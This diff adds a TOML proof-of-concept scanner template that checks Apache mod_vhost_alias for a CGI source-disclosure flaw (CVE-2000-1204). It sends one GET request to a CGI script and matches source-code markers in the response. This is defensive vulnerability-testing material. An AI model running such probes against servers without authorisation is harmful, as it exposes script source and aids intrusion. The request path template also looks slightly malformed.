@@ -1,0 +1,29 @@
+[info]
+author = "ave"
+description = "验证Apache HTTP Server的mod_vhost_alias模块是否存在CGI源代码泄露漏洞。当cgi-bin目录位于文档根目录下时，远程攻击者可通过直接访问CGI脚本获取其源代码，而非获得执行结果。"
+id = "POC-AVE-2000-1146"
+name = "Apache mod_vhost_alias CGI Source Disclosure PoC"
+severity = "medium"
+tags = ["ave-2000-1146"]
+vuln_id = [
+    "CVE-2000-1204",
+    "AVE-2000-1146",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/cgi-bin/test.cgi"
+protocol = "http"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "#!/bin/",
+    "<html>",
+    "Content-type:",
+]
